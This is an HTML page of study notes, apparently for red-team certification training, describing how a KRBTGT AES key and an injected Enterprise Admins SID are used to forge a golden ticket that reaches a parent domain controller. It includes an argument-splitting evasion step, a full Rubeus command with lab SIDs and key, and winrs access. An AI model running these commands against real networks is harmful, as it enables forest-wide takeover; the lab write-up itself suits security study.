@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CRTP Part 17 - Enterprise Trust - SID-History with KRBTGT | Mr Stark Study Notes</title>
+
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  
+  <style>
+    .goad-content {
+      max-width: 100%;
+      margin: 0 auto;
+      padding: 30px;
+      font-size: 20px;
+    }
+    
+    .goad-content h1 {
+      color: var(--white-2);
+      font-size: 36px;
+      margin-bottom: 25px;
+    }
+    
+    .goad-content h2 {
+      color: var(--orange-yellow-crayola);
+      font-size: 30px;
+      margin: 35px 0 20px 0;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--jet);
+    }
+    
+    .goad-content h3 {
+      color: var(--white-1);
+      font-size: 26px;
+      margin: 30px 0 15px 0;
+    }
+    
+    .goad-content h4 {
+      color: var(--white-2);
+      font-size: 24px;
+      margin: 25px 0 15px 0;
+    }
+    
+    .goad-content p {
+      color: var(--light-gray);
+      margin-bottom: 18px;
+      line-height: 1.8;
+      font-size: 20px;
+    }
+    
+    .goad-content code {
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-family: 'Courier New', monospace;
+      font-size: 18px;
+    }
+    
+    .goad-content pre {
+      background: var(--eerie-black-2);
+      border: 1px solid var(--jet);
+      border-radius: 8px;
+      padding: 20px;
+      overflow-x: auto;
+      margin: 20px 0;
+      max-width: 100%;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+    }
+    
+    .goad-content pre code {
+      background: transparent;
+      color: var(--light-gray);
+      padding: 0;
+      font-size: 18px;
+    }
+    
+    .goad-content img {
+      max-width: 100%;
+      border-radius: 8px;
+      margin: 25px 0;
+      border: 1px solid var(--jet);
+    }
+    
+    .goad-content ul, .goad-content ol {
+      color: var(--light-gray);
+      margin: 20px 0;
+      padding-left: 40px;
+      font-size: 20px;
+    }
+    
+    .goad-content li {
+      margin-bottom: 10px;
+      color: var(--light-gray);
+    }
+    
+    .goad-content strong {
+      color: var(--white-2);
+    }
+    
+    .goad-content blockquote {
+      border-left: 3px solid var(--orange-yellow-crayola);
+      padding-left: 20px;
+      margin: 20px 0;
+      color: var(--light-gray);
+      font-style: italic;
+      font-size: 20px;
+    }
+    
+    .goad-sidebar-list {
+      list-style: none;
+      padding: 0;
+    }
+    
+    .goad-sidebar-list li {
+      margin-bottom: 8px;
+    }
+    
+    .goad-sidebar-list a {
+      color: var(--light-gray);
+      text-decoration: none;
+      display: block;
+      padding: 10px 15px;
+      border-radius: 8px;
+      transition: all 0.3s;
+      font-size: 16px;
+    }
+    
+    .goad-sidebar-list a:hover,
+    .goad-sidebar-list a.active {
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+    }
+    
+    .goad-sidebar-list a.active {
+      background: var(--orange-yellow-crayola);
+      color: var(--eerie-black-1);
+      font-weight: var(--fw-500);
+    }
+    
+    .back-link {
+      color: var(--light-gray);
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 25px;
+      font-size: 16px;
+    }
+    
+    .back-link:hover {
+      color: var(--orange-yellow-crayola);
+    }
+  </style>
+</head>
+
+<body>
+
+  <main>
+
+    <!-- Sidebar -->
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTP Series</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Parts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        
+        <a href="../index.html" class="back-link">
+          <ion-icon name="arrow-back-outline"></ion-icon>
+          Back to Portfolio
+        </a>
+        
+        <div class="separator"></div>
+        
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Select Part:</p>
+        
+        <ul class="goad-sidebar-list">
+          <li><a href="index.html">Overview</a></li>
+          <li><a href="part-1-powershell-overview.html">PowerShell Overview</a></li>
+          <li><a href="part-2-powershell-detections.html">PowerShell Detections</a></li>
+          <li><a href="part-3-enumeration.html">Enumeration</a></li>
+          <li><a href="part-4-privilege-escalation.html">Privilege Escalation</a></li>
+          <li><a href="part-5-privesc-domain-admin.html">Privilege Escalation via Domain Admin</a></li>
+          <li><a href="part-6-golden-ticket.html">Golden Ticket</a></li>
+          <li><a href="part-7-silver-ticket.html">Silver Ticket</a></li>
+          <li><a href="part-8-diamond-ticket.html">Diamond Ticket</a></li>
+          <li><a href="part-9-dsrm-credentials.html">Abusing DSRM Credentials</a></li>
+          <li><a href="part-10-dcsync-attack.html">DCSync Attack</a></li>
+          <li><a href="part-11-security-descriptor.html">Security Descriptor Abuse</a></li>
+          <li><a href="part-12-asrep-roasting.html">ASREP-Roasting Attack</a></li>
+          <li><a href="part-13-unconstrained-delegation.html">Unconstrained Delegation</a></li>
+          <li><a href="part-14-constrained-delegation.html">Constrained Delegation</a></li>
+          <li><a href="part-15-rbcd.html">Resource-Based Constrained Delegation</a></li>
+          <li><a href="part-16-enterprise-trust-ticket.html">Enterprise Trust - SID-History with Trust Ticket</a></li>
+          <li><a href="part-17-enterprise-krbtgt.html" class="active">Enterprise Trust - SID-History with KRBTGT</a></li>
+          <li><a href="part-18-crossforest-trust.html">CrossForest Trust - Trust Flow</a></li>
+          <li><a href="part-19-adcs-attacks.html">ADCS Attacks</a></li>
+          <li><a href="part-20-trust-links.html">Trust Links Abuse</a></li>
+          <li><a href="part-21-mde-mdi-bypass.html">MDE/MDI Bypass</a></li>
+        </ul>
+
+        <div class="separator"></div>
+        
+        <ul class="social-list">
+          <li class="social-item">
+            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
+              <ion-icon name="logo-github"></ion-icon>
+            </a>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <!-- Main Content -->
+    <div class="main-content">
+
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Enterprise Trust - SID-History with KRBTGT</header>
+        
+        <section class="goad-content">
+          
+<h1>CRTP - Certified Red Team Professional</h1>
+
+
+<h2>Enterprise Admin Trust - SID-History Abuse with KRBTGT hash</h2>
+
+
+<h3>SID-History Abuse with KRBTGT Hash</h3>
+
+
+<p>SID-History Abuse with KRBTGT hash is a technique used to escalate privileges and bypass access controls in Windows systems. It involves injecting higher-privileged SIDs into the SID History attribute of a user account, effectively granting the user the permissions associated with those higher-privileged groups.</p>
+<h3>How SID-History Abuse Works</h3>
+
+
+<p>1. Compromising a Standard User Account: An attacker first compromises a standard user account with some level of privileges.</p>
+<p>1. Adding Higher-Privileged SIDs: The attacker then adds the SID of a higher-privileged group (such as Enterprise Admins or Domain Admins) to the SID History attribute of the compromised user account.</p>
+<p>1. Elevated Access: With the higher-privileged SIDs in the SID History, the user account now has elevated access to resources and systems within the parent domain.</p>
+<h3>KRBTGT Hash Abuse</h3>
+
+
+<p>The KRBTGT hash is a critical component in the SID-History Abuse process. The KRBTGT hash is used to sign the Kerberos tickets, which are used to authenticate users and grant access to resources.</p>
+<h3>How KRBTGT Hash Abuse Works</h3>
+
+
+<p>1. Compromising the KRBTGT Hash: An attacker compromises the KRBTGT hash, which is used to sign Kerberos tickets.</p>
+<p>1. Forging Kerberos Tickets: The attacker uses the compromised KRBTGT hash to forge Kerberos tickets that can be used to access resources across the domain.</p>
+<p>1. Elevated Access: With the forged Kerberos tickets, the attacker can access resources and systems within the domain, effectively bypassing normal access controls.</p>
+
+<p>Assuming that we were able to compromise Domain Admin and we have KRBTGT hash dumped, it gets easy to abuse trusts used the KRBTGT.</p>
+<p>Having a session as Domain Admin, we can simply use Rubeus to abuse this SID-History with KRBTGT hash.</p>
+
+<p>With DCORP-DC(dollarcorp DC) KRBTGT secrets we can simply create a golden ticket and access MCORP-DC. I’ll be using AES256 key here.</p>
+
+<p>Let’s encode out Rubeus payload with Argsplit.bat and copy/paste it.</p>
+<p>ArgSplit.bat</p>
+<p>golden</p>
+<pre><code>[!] Argument Limit: 180 characters
+[+] Enter a string: golden
+set "z=n"
+set "y=e"
+set "x=d"
+set "w=l"
+set "v=o"
+set "u=g"
+set "Pwn=%u%%v%%w%%x%%y%%z%"</code></pre>
+
+
+
+<p>Now let’s use Rubeus to forge our Golden Ticket and Access to Parent Domain Controller.</p>
+<p>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt</p>
+<img src="./images/screenshot_139.png" alt="">
+
+
+<p>We can see above that our tickey has been successfully imported into our Cached Ticket</p>
+<p>We can double check out Cached Ticket witht klist command.</p>
+
+<p>klist</p>
+<img src="./images/screenshot_140.png" alt="">
+
+
+<p>We can confirm above that we do have a valid ticket into our Cached Tickets session.</p>
+<p>Now let’s access MDCORP-DC in moneycorp.local domain.</p>
+
+<p>winrs -r:mcorp-dc.moneycorp.local cmd</p>
+<img src="./images/screenshot_141.png" alt="">
+
+
+<p>Adn this way we were able to abuse SID-History with KRBTGT Hash.</p>
+
+
+<div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--jet); display: flex; justify-content: space-between;">
+  <a href="part-16-enterprise-trust-ticket.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">&larr; Previous: Part 16</a>
+  <a href="part-18-crossforest-trust.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">Next: Part 18 &rarr;</a>
+</div>
+
+        </section>
+
+      </article>
+
+    </div>
+
+  </main>
+
+  <script src="../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+
+</body>
+
+</html>
